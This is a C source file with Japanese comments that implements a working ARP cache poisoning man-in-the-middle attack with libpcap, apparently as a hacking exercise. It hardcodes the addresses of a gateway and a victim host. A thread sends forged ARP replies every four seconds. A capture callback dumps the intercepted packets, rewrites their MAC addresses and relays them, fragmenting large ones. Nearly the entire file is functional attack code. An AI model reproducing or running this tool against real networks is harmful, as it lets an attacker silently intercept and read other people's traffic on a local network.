#include <pcap.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include "hacking.h"

#define MTU 1480
//スプーフィングするmac,ipアドレス
u_char my_mac[6]={0x00,0x28,0xf8,0xd3,0x00,0x9f};
u_char mac[2][6]={{0xa4,0x12,0x42,0xc9,0xcd,0x2c},{0x40,0x40,0xa7,0x91,0xcc,0xcc}};
u_char ip[2][4]={{192,168,0,1},{192,168,0,6}};
u_char my_ip[4]={192,168,0,8};
u_char net_ip[4]={0,0,0,0};
//u_char my_mac[6]={0x0a,0x00,0x27,0x00,0x00,0x00};
//u_char mac[2][6]={{0x08,0x00,0x27,0x59,0x5e,0xae},{0x08,0x00,0x27,0xd1,0x21,0xea}};
//u_char ip[2][4]={{0xc0,0xsa8,0x38,0x65},{0xc0,0xa8,0x38,0x66}};

char* device="wlp2s0";
u_char* fragments;

//ARPキャッシュポイズン
struct arp_packet *arp_pkt_tgt;
struct arp_packet *arp_pkt_dst;

//pcap用のハンドルとthread
pthread_t pthread;
char errbuf[PCAP_ERRBUF_SIZE];
pcap_t *pcap_handle;

//prototype宣言
void caught_packet(u_char*,const struct pcap_pkthdr*,const u_char*);
void *send_poison(void*);
void initialize();
void generate_arp_pkt(struct arp_packet*,u_char*,u_char*,u_char*);
void create_fpacket(u_char*,const u_char*,int,int,int);
void my_sendpacket(pcap_t*,const u_char*,int);
int check_packet(const u_char*,int,int);

int main(int argc,char** argv){
    initialize();
    pthread_create(&pthread,NULL,send_poison,argv);//thread生成
    pcap_loop(pcap_handle,-1,caught_packet,NULL);//capture開始
    pthread_join(pthread,NULL);//thread終了時ここに戻る
}

//ARPパケットやpcap_handleの初期化
void initialize(){
    arp_pkt_tgt=(struct arp_packet*)malloc(sizeof(struct arp_packet));
    arp_pkt_dst=(struct arp_packet*)malloc(sizeof(struct arp_packet));
    fragments=(u_char*)malloc(64000);
    pcap_handle=pcap_open_live(device,8192,1,0,errbuf);
    if(pcap_handle==NULL)
	    pcap_fatal("pcap_open_live",errbuf);
    generate_arp_pkt(arp_pkt_tgt,ip[0],mac[1],ip[1]);
    generate_arp_pkt(arp_pkt_dst,ip[1],mac[0],ip[0]);
    
}

//ARPパケットの生成
void generate_arp_pkt(struct arp_packet* buffer,u_char* sender_ip,u_char* target_mac,u_char* target_ip){

    //Etherフレームの生成
    memcpy(buffer->ether.ether_dest_addr,target_mac,6);
    memcpy(buffer->ether.ether_src_addr,my_mac,6);
    buffer->ether.ether_type=0x0608;

    //ARPヘッダの生成
    buffer->arp.hardware_type=0x0100;
    buffer->arp.protocol_type=0x0008;
    buffer->arp.hardware_size=0x06;
    buffer->arp.protocol_size=0x04;
    buffer->arp.opcode=0x0200;
    memcpy(buffer->arp.sender_mac,my_mac,6);
    memcpy(buffer->arp.sender_ip,sender_ip,4);
    memcpy(buffer->arp.target_mac,target_mac,6);
    memcpy(buffer->arp.target_ip,target_ip,4);
    
}


//PacketをキャプチャしたときのCallback関数
void caught_packet(u_char* user_args,const struct pcap_pkthdr* cap_header,const u_char *packet){
    int data_length=cap_header->len;
    
    //packetからetherヘッダを取り出す。
    struct ether_hdr* ether_header=(struct ether_hdr*)packet;
    u_char* src_addr=ether_header->ether_src_addr;
    u_char* dest_addr=ether_header->ether_dest_addr;

    //etherヘッダの送信元macがmac1と等しく、宛先macがmy_macに等しいとき
    if(check_packet(packet,0,1)==0){
        printf("\n\nGet Packet\n");
        dump(packet,cap_header->len);
        printf("from mac[0]\n");
	    memcpy(dest_addr,mac[1],6);
	    memcpy(src_addr,my_mac,6);
	    my_sendpacket(pcap_handle,packet,data_length);   
    }else if(check_packet(packet,1,0)==0){
	    printf("\n\nGet Packet\n");
        dump(packet,cap_header->len);
        printf("from mac[1]\n");
	    memcpy(dest_addr,mac[0],6);
	    memcpy(src_addr,my_mac,6);
        my_sendpacket(pcap_handle,packet,data_length);
    }
    
}

int check_packet(const u_char* packet,int from,int to){

    struct ether_hdr* ether_header=(struct ether_hdr*)packet;
    u_char* src_addr=ether_header->ether_src_addr;
    u_char* dest_addr=ether_header->ether_dest_addr;

    struct ip_hdr* ip_header=(struct ip_hdr*)(packet+14);
    u_char* src_ip=ip_header->ip_src_addr;
    u_char* dest_ip=ip_header->ip_dest_addr;

    //if(compare_ip(dest_ip,my_ip)==1&&compare_ip(src_ip,my_ip)==1&&compare_mac(src_addr,mac[from])==0&&compare_mac(dest_addr,my_mac)==0){
    if(compare_mac(src_addr,mac[from])==0&&compare_mac(dest_addr,my_mac)==0&&(compare_ip(dest_ip,ip[1])==0||compare_ip(src_ip,ip[1])==0)){
        printf("%d,%d,%d,%d\n",src_ip[0],src_ip[1],src_ip[2],src_ip[3]);
        printf("%d,%d,%d,%d\n",dest_ip[0],dest_ip[1],dest_ip[2],dest_ip[3]);
        return 0;
    }else 
        return 1;
}


//threadでARPキャッシュポイズンを送る
void *send_poison(void *argv){
    while(1){
        pcap_sendpacket(pcap_handle,(u_char*)arp_pkt_tgt,42);
	    pcap_sendpacket(pcap_handle,(u_char*)arp_pkt_dst,42);
        sleep(4);
    }
}

//フラグメント化を含めたパケット送信関数
void my_sendpacket(pcap_t* pcap_handle,const u_char* packet,int length){
    
    //パケットサイズが1514以下の場合はフラグメント化なしで送る
    if(length<=MTU+34){
        pcap_sendpacket(pcap_handle,packet,length);
        printf("\n\nSend Packet\n");
        //dump(packet,length);
        return;
    }

    //Nで分割するパケットの個数を定義する。
    int N=((length-34)%MTU==0?(length-34)/MTU:(length-34)/MTU+1);
   
    for(int i=0;i<N;i++){
        if(i!=N-1){
            create_fpacket(fragments+(MTU+34)*i,packet,i,0,MTU);
            pcap_sendpacket(pcap_handle,fragments+(MTU+34)*i,MTU+34);
            printf("\n\nSend Fragmented Packet %d\n",i);
            //dump(fragments+(MTU+34)*i,MTU+34);
        }else{
            create_fpacket(fragments+(MTU+34)*i,packet,i,1,length-34-MTU*(N-1));
            pcap_sendpacket(pcap_handle,fragments+(MTU+34)*i,length-MTU*(N-1));
            printf("\n\nSend Fragmented Packet END\n");
            //dump(fragments+(MTU+34)*i,length-MTU*(N-1));
	    }
    }

}

//Indexを与えてフラグメント化されたパケットを生成する
void create_fpacket(u_char* buffer,const u_char* src,int index,int last,int data_length){

    memcpy(buffer,src,14);//etherヘッダの情報は同じ
    struct ip_hdr* ip_header=(struct ip_hdr*)(buffer+14);
    struct ip_hdr* src_ip_header=(struct ip_hdr*)(src+14);
    
    //fragmentのIPヘッダを生成する。
    ip_header->ip_version_and_header_length=src_ip_header->ip_version_and_header_length;
    ip_header->ip_tos=src_ip_header->ip_tos;
    ip_header->ip_len=ledecimal(20+data_length);//IPヘッダ+データの長さ
    ip_header->ip_id=src_ip_header->ip_id;
    ip_header->ip_frag_offset=((last==0)?32+ledecimal(MTU*index/8):ledecimal(MTU*index/8));//32はMFフラグ
    ip_header->ip_ttl=src_ip_header->ip_ttl;
    ip_header->ip_type=src_ip_header->ip_type;
    memcpy(ip_header->ip_checksum,src_ip_header->ip_checksum,2);
    memcpy(ip_header->ip_src_addr,src_ip_header->ip_src_addr,4);
    memcpy(ip_header->ip_dest_addr,src_ip_header->ip_dest_addr,4);

    //IPフラグメントヘッダの後ろを生成
    u_char* src_data=(u_char*)(src+34+index*MTU);
    memcpy(buffer+34,src_data,data_length);

}
